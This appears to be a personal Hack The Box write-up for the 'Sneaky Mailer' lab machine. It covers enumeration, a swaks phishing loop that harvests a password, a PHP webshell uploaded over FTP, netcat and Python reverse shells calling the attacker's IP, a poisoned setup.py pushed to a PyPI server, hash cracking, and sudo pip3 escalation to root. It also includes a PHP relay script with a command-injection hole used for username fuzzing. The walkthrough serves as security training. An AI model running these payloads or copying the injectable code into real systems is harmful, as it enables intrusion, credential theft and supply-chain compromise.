@@ -1,0 +1,681 @@
+HTB - Sneaky Mailer
+
+Ran nmap scan, multiple open ports: 21,22,25,80,143,8080
+
+Modify hosts file to include ip/hostname pairing: 10.10.10.197 sneakycorp.htb
+
+Next we open the webpage and look ath the output
+
+Next we will start a gobuster, find out language being used by nginx based on page source we see 
+reference to php file which means it is likely using php as its language.
+
+Box is most likely going to be phishing since it is one of few boxes with web servers stood up.
+COMMAND:
+==================================================================================================
+gobuster dir -u http://sneakycorp.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+==================================================================================================
+
+OUPUT:
+==================================================================================================
+==================================================================================================
+
+COMMAND:
+==================================================================================================
+gobuster dir -u http://10.10.10.197:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+==================================================================================================
+OUPUT:
+==================================================================================================
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.197:8080
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/01 18:57:32 Starting gobuster
+===============================================================
+/. (Status: 301)
+===============================================================
+2020/12/01 19:07:27 Finished
+===============================================================
+==================================================================================================
+
+If you click on the Team link tab you get a list of emails. We can scrape for the email by literally
+copying and pasting them into a file and using awk to grab the last column that has the actual 
+emails.
+
+COMMAND:
+==================================================================================================
+cat teams.txt | awk '{print $NF}' > emails.txt
+OR 
+awk -F"\t" '{print $4}' teams.txt
+==================================================================================================
+
+OUPUT:
+==================================================================================================
+....
+...
+..
+paulbyrd@sneakymailer.htb
+prescottbartlett@sneakymailer.htb
+quinnflynn@sneakymailer.htb
+rhonadavidson@sneakymailer.htb
+sakurayamamoto@sneakymailer.htb
+..
+...
+....
+==================================================================================================
+
+Next step in the process is to send mail via smtp. We will us a tool named, swaks. We will be 
+creating a phishing bash script. At the same time we will create a persistent netcat connection
+in case multiple people click on link.
+
+COMMAND:
+==================================================================================================
+#!/bin/bash
+for email in $(cat emails.txt)
+do
+	swaks \
+		--from support@sneakycorp.htb \
+		--to $email \
+		--header 'Subject: Please Register Your Account' \
+		--body 'http://10.10.14.11/register.php' \
+		--server sneakycorp.htb
+done
+==================================================================================================
+OUPUT:
+==================================================================================================
+nc -lnvkp 80
+listening on [any] 80 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.197] 50940
+POST /register.php HTTP/1.1
+Host: 10.10.14.11
+User-Agent: python-requests/2.23.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+
+firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+==================================================================================================
+
+We will now use burp suite to decode the request. After decoding we get the following:
+INFO:
+==================================================================================================
+firstName=Paul&
+lastName=Byrd&
+email=paulbyrd@sneakymailer.htb&
+password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&
+rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+==================================================================================================
+
+There was an ftp site, so we can now attempt to login via ftp.
+
+We can now install a mail client, apt install thunderbird. After which we can use the obtained 
+credentials to get inside the users mailbox and look for other interesting bits of info.
+
+There were issues with thunderbird so instead we will use evolution mail client. Based on the Sent
+Items tab from within paul byrds mail settings we see a couple of emails.
+INFO:
+==================================================================================================
+Hello administrator, I want to change this password for the developer account
+ 
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+ 
+Please notify me when you do itV
+==================================================================================================
+
+
+We can now attempt to ssh or use ftp to get a foothold on the box
+COMMAND:
+==================================================================================================
+ftp 10.10.10.197
+==================================================================================================
+OUPUT:
+==================================================================================================
+root@kali:~/htb/sneakymailer# ftp 10.10.10.197
+Connected to 10.10.10.197.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.197:root): developer
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxr-x    8 0        1001         4096 Jun 30 00:15 dev
+==================================================================================================
+
+We can now create a directory called ftp on our local box and download the contents of that directory
+to further examine. We can also do a recursive download of ftp server using wget
+COMMAND:
+==================================================================================================
+wget --user developer --password 'm^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CV' -r ftp://10.10.10.197
+==================================================================================================
+OUPUT:
+==================================================================================================
+....
+...
+..
+10.10.10.197/dev/scss/uti 100%[==================================>]      90  --.-KB/s    in 0s      
+
+2020-12-01 20:42:15 (632 KB/s) - ‘10.10.10.197/dev/scss/utilities/_rotate.scss’ saved [90]
+
+--2020-12-01 20:42:15--  ftp://10.10.10.197/dev/scss/utilities/_text.scss
+           => ‘10.10.10.197/dev/scss/utilities/_text.scss’
+==> CWD not required.
+==> PASV ... done.    ==> RETR _text.scss ... done.
+Length: 699
+
+10.10.10.197/dev/scss/uti 100%[==================================>]     699  --.-KB/s    in 0s      
+
+2020-12-01 20:42:15 (44.6 MB/s) - ‘10.10.10.197/dev/scss/utilities/_text.scss’ saved [699]
+
+--2020-12-01 20:42:15--  ftp://10.10.10.197/dev/vendor/
+..
+...
+....
+==================================================================================================
+
+
+We can attempt to see if we can upload a file to the ftp server by using the "put" command.
+We are able to upload a file however there appears to be a cron job that deletes any new added files
+every minute. We can attempt to upload a php webshell and execute it to get remote code execution.
+COMMAND:
+==================================================================================================
+vim shell.php
+==================================================================================================
+OUPUT:
+==================================================================================================
+<?php system($_REQUEST["runme"]); ?>
+==================================================================================================
+
+Now we can upload the shell and execute commands.
+
+COMMAND:
+==================================================================================================
+http://dev.sneakycorp.htb/shell.php?runme=id
+==================================================================================================
+OUPUT:
+==================================================================================================
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+==================================================================================================
+
+IMPORTANT:
+==================================================================================================
+One thing to add is the prefix "dev" to the hostname of the box otherwise the shell will not be 
+able to execute due to virtual host routing. We also use burp suite to try and get a persistent 
+reverse shell.
+==================================================================================================
+
+We can get a shell using the native netcat binary inside the system by passing it in burp suite
+the request is below.
+INFO:
+==================================================================================================
+POST /shell.php HTTP/1.1
+
+Host: dev.sneakycorp.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 36
+
+
+
+runme=nc -e /bin/sh 10.10.14.11 1234
+==================================================================================================
+
+We find the user flag inside the user low's directory but we do not have permission to use it.
+So we will moost likely have to escalate to that user.
+
+We can try and grep for any activve processes being used by the low user
+COMMAND:
+==================================================================================================
+ps -ef | grep low
+==================================================================================================
+OUPUT:
+==================================================================================================
+low       1091     1  0 15:18 ?        00:00:10 /home/low/venv/bin/python /opt/scripts/low/install-modules.py
+==================================================================================================
+
+We go to that directory however we do not have any permissions to any of the directories in there,
+next we can do is go back to our original directory and search for more clues to privesc. If we go
+into the 'pypi.sneakycorp.htb' directory we will find an './.htpasswd' inside the file is password
+we can attempt to crack.
+COMMAND:
+==================================================================================================
+cd pypi.sneakycorp.htb
+find . -type f
+cat ./.htpasswd
+==================================================================================================
+OUPUT:
+==================================================================================================
+pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+==================================================================================================
+
+We look for the format by uusing the follwoing command so we can crack it using hashcat.
+
+COMMAND:
+==================================================================================================
+hashcat --example-hashes | grep -B2 apr1
+==================================================================================================
+OUPUT:
+==================================================================================================
+
+MODE: 1600
+TYPE: Apache $apr1$ MD5, md5apr1, MD5 (APR)
+HASH: $apr1$62722340$zGjeAwVP2KwY6MtumUI1N/
+==================================================================================================
+
+We can attempt to crack the password with hashcat, we remove the user and colon and have hashcat 
+atteempt to crack using the rockyou wordlist
+COMMAND:
+==================================================================================================
+hashcat --force -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
+==================================================================================================
+OUPUT:
+==================================================================================================
+....
+...
+..
+
+$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
+Hash.Target......: $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+Time.Started.....: Tue Dec  1 22:03:13 2020, (4 mins, 47 secs)
+Time.Estimated...: Tue Dec  1 22:08:00 2020, (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    12435 H/s (10.16ms) @ Accel:256 Loops:250 Thr:1 Vec:8
+
+..
+...
+....
+==================================================================================================
+
+The password for the user pypi is: soufianeelhaoui
+We will now add pypi domain name to our hosts file so we can access it. we can go ahead and access
+the domain by specifying port 8080 in our request for the page.
+COMMAND:
+==================================================================================================
+http://pypi.sneakycorp.htb:8080/
+==================================================================================================
+OUPUT:
+==================================================================================================
+ Welcome to pypiserver!
+
+This is a PyPI compatible package index serving 0 packages.
+
+To use this server with pip, run the following command:
+
+        pip install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]
+      
+
+To use this server with easy_install, run the following command:
+
+        easy_install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...]
+      
+
+The complete list of all packages can be found here or via the simple index.
+
+This instance is running version 1.3.2 of the pypiserver software. 
+==================================================================================================
+
+Now we can google how to create a malicious pypi package and see what comes out. We can also google
+how to create a pypi package. Our endgoal is to have a user execute the package and get a reverse 
+shell from it.
+
+Link for pypi package creation:
+https://packaging.python.org/tutorials/packaging-projects/
+
+We will need to modify the setup.py portion of the script and have it execute the reverse shell from
+there.
+COMMAND:
+==================================================================================================
+mkdir pypi
+cd pypi
+mkdir mypackage
+cd mypackage
+vi __init__.py
+vi .pypirc
+vi setup.py
+==================================================================================================
+
+We also create the ".pypirc" file that will use the pypi creds to gain the reverse shell.
+OUPUT:
+==================================================================================================
+[distutils]
+index-servers = remote
+
+[remote]
+repository: http://pypi.sneakycorp.htb:8080
+username: pypi
+password: soufianeelhaoui
+
+==================================================================================================
+
+Python Reverse Shell Code from within setup.py
+COMMAND:
+==================================================================================================
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.11",5555));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+==================================================================================================
+
+We can now try and get the reverse shell by using the following command for python.
+The key thing is to have two simultaneous terminals with same port open with netcat in order
+to receive the request from the target machine and then get the reverse shell call back.
+COMMAND:
+==================================================================================================
+python3 setup.py sdist upload -r remote
+==================================================================================================
+
+After getting the reverse shell, to maintain persistence we can upload our public key to the server
+and ssh at will.
+
+We can try sudo -l and see what we can do to try and get root.
+COMMAND:
+==================================================================================================
+sudo -l
+==================================================================================================
+OUPUT:
+==================================================================================================
+	sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+Matching Defaults entries for low on sneakymailer:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User low may run the following commands on sneakymailer:
+    (root) NOPASSWD: /usr/bin/pip3
+==================================================================================================
+
+
+We can easily get root by using gtfo bin for pip3. It can be found in the following site:
+https://gtfobins.github.io/gtfobins/pip/#sudo
+
+Sudo takes a while to run since there is an error with the reverse lookup name that can be solved
+by gaining root and modyfing the name resolution properly and adding "smeakymailer" to the hosts file
+
+COMMAND:
+==================================================================================================
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+==================================================================================================
+OUPUT:
+==================================================================================================
+low@sneakymailer:~$ TF=$(mktemp -d)
+low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF
+sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+Processing /tmp/tmp.Puxa4Vl9II
+# whoami
+root
+==================================================================================================
+
+
+Now we can go back and revisit the ftp enumeration piece of the machine.
+
+First step is to make problem more familiar. Convert ftp tp http. Move ftp to http.
+Make php script and echo something into ftp 
+INFO: index.php
+==================================================================================================
+<?php
+	system("echo " . $_REQUEST['name'] . " | ftp 10.10.10.197");
+?>
+==================================================================================================
+
+Once we have created our php script. we can create a local webserver from which we can serve
+requests and have our server relay to the remote ftp. The whole goal is to be able to have a metric
+aka the length size of the output, and use that as a way to distingish valid usernames to invalid
+usernames.
+INFO:
+==================================================================================================
+root@kali:~/htb/sneakymailer/php# php -S 127.0.0.1:80
+==================================================================================================
+COMMAND:
+==================================================================================================
+root@kali:~/htb/sneakymailer/php# php -S 127.0.0.1:80
+[Wed Dec  2 21:53:12 2020] PHP 7.4.11 Development Server (http://127.0.0.1:80) started
+[Wed Dec  2 21:54:06 2020] 127.0.0.1:49896 Accepted
+Login failed.
+[Wed Dec  2 21:54:07 2020] 127.0.0.1:49896 [200]: GET /?name=ippsec
+[Wed Dec  2 21:54:07 2020] 127.0.0.1:49896 Closing
+[Wed Dec  2 21:58:19 2020] 127.0.0.1:49900 Accepted
+Login failed.
+==================================================================================================
+
+We can now submit or reqest in the form of a user and have the php server act as a relay.
+OUTPUT:
+==================================================================================================
+root@kali:~/htb/sneakymailer# curl 127.0.0.1/?name=ippsec
+Name (10.10.10.197:root): Permission denied.
+==================================================================================================
+
+We can se timeout to make sure the connection is severed. We can now also use ffuf to automate and
+fuzz using a wordlist.
+COMMAND:
+==================================================================================================
+apt install ffuf
+ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -u http://localhost/?name=FUZZ
+==================================================================================================
+
+It should now go and automatically, use each username in the list.
+OUTPUT:
+==================================================================================================
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://localhost/?name=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+azureuser               [Status: 200, Size: 46, Words: 4, Lines: 3]
+vagrant                 [Status: 200, Size: 46, Words: 4, Lines: 3]
+ec2-user                [Status: 200, Size: 46, Words: 4, Lines: 3]
+ansible                 [Status: 200, Size: 46, Words: 4, Lines: 3]
+puppet                  [Status: 200, Size: 46, Words: 4, Lines: 3]
+pi                      [Status: 200, Size: 46, Words: 4, Lines: 3]
+==================================================================================================
+
+In the event you get error from ffuf, consider lowering the amount of threads being used by the 
+program. For example:
+COMMAND:
+==================================================================================================
+root@kali:~/htb/sneakymailer/php# ffuf -w ./fake-list.txt -u http://localhost/?name=FUZZ -timeout 5 -t 2
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://localhost/?name=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 5
+ :: Threads          : 2
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+ehewbsbns               [Status: 200, Size: 46, Words: 4, Lines: 3]
+hehehehe                [Status: 200, Size: 46, Words: 4, Lines: 3]
+terasd                  [Status: 200, Size: 46, Words: 4, Lines: 3]
+nio                     [Status: 200, Size: 46, Words: 4, Lines: 3]
+tesla                   [Status: 200, Size: 46, Words: 4, Lines: 3]
+crm                     [Status: 200, Size: 46, Words: 4, Lines: 3]
+developer               [Status: 200, Size: 1, Words: 1, Lines: 2]
+done                    [Status: 200, Size: 46, Words: 4, Lines: 3]
+logic                   [Status: 200, Size: 46, Words: 4, Lines: 3]
+is                      [Status: 200, Size: 46, Words: 4, Lines: 3]
+over                    [Status: 200, Size: 46, Words: 4, Lines: 3]
+from                    [Status: 200, Size: 46, Words: 4, Lines: 3]
+him                     [Status: 200, Size: 46, Words: 4, Lines: 3]
+:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
+==================================================================================================
+
+Also adding a timeout to the php script while making the request can ensure the connection is 
+severed as this could potentially cause issues.
+Info:
+==================================================================================================
+system("echo " . $_REQUEST['name'] . " | timeout 2 ftp 10.10.10.197");
+==================================================================================================
+
+We can also filter out the size using the -fs option on ffuf,
+COMMAND:
+==================================================================================================
+root@kali:~/htb/sneakymailer/php# ffuf -w ./fake-list.txt -u http://localhost/?name=FUZZ -timeout 5 -t 2 -fs 46
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://localhost/?name=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 5
+ :: Threads          : 2
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: 46
+________________________________________________
+
+developer               [Status: 200, Size: 1, Words: 1, Lines: 2]
+:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
+
+==================================================================================================
+
+And as you can see we now have the valid user being displayed. We can make the webserver threaded.
+The apache server can accomlplish this. So when you do "python3 http.server" you should add "wsgi"
+as this will handle executing the script and making it threaded.
+
+We can speed this process up by using the apache webserver in conjunction with php.
+
+COMMAND:
+==================================================================================================
+root@kali:~/htb/sneakymailer/php# cp index.php /var/www/html/
+# We can the make sure that php modules are installed
+root@kali:/etc/apache2/mods-available# ls | grep -i php
+php7.3.conf
+php7.3.load
+php7.4.conf
+php7.4.load
+# Then we can also list enabled mods as well
+root@kali:/etc/apache2/mods-enabled# ls | grep -i php
+php7.3.conf
+php7.3.load
+# We can now enable the mod
+root@kali:/etc/apache2/mods-enabled# a2dismod php7.3
+Module php7.3 disabled.
+To activate the new configuration, you need to run:
+  systemctl restart apache2
+root@kali:/etc/apache2/mods-enabled# a2enmod php7.3
+Considering dependency mpm_prefork for php7.3:
+Considering conflict mpm_event for mpm_prefork:
+Considering conflict mpm_worker for mpm_prefork:
+Module mpm_prefork already enabled
+Considering conflict php5 for php7.3:
+Enabling module php7.3.
+To activate the new configuration, you need to run:
+  systemctl restart apache2
+root@kali:/etc/apache2/mods-enabled# systemctl restart apache2
+==================================================================================================
+
+Now we can navigate via a webrowser and look at the requests. If we look at the page source we will
+see the code being used by the server.
+
+Now we can use ffuf again and see if it goes any faster since we are using php. Now we won't have to
+worry about changing the threads. Also don't forget to change the url.
+
+COMMAND:
+==================================================================================================
+root@kali:~/htb/sneakymailer/php# ffuf -w ./fake-list.txt -u http://localhost/index.php?name=FUZZ 
+==================================================================================================
+OUTPUT:
+==================================================================================================
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://localhost/index.php?name=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+from                    [Status: 200, Size: 50, Words: 4, Lines: 3]
+is                      [Status: 200, Size: 50, Words: 4, Lines: 3]
+done                    [Status: 200, Size: 50, Words: 4, Lines: 3]
+tesla                   [Status: 200, Size: 50, Words: 4, Lines: 3]
+logic                   [Status: 200, Size: 50, Words: 4, Lines: 3]
+terasd                  [Status: 200, Size: 50, Words: 4, Lines: 3]
+crm                     [Status: 200, Size: 50, Words: 4, Lines: 3]
+over                    [Status: 200, Size: 50, Words: 4, Lines: 3]
+nio                     [Status: 200, Size: 50, Words: 4, Lines: 3]
+ehewbsbns               [Status: 200, Size: 50, Words: 4, Lines: 3]
+developer               [Status: 200, Size: 1, Words: 1, Lines: 2]
+hehehehe                [Status: 200, Size: 50, Words: 4, Lines: 3]
+him                     [Status: 200, Size: 50, Words: 4, Lines: 3]
+:: Progress: [13/13] :: Job [1/1] :: 4 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+
+==================================================================================================
+
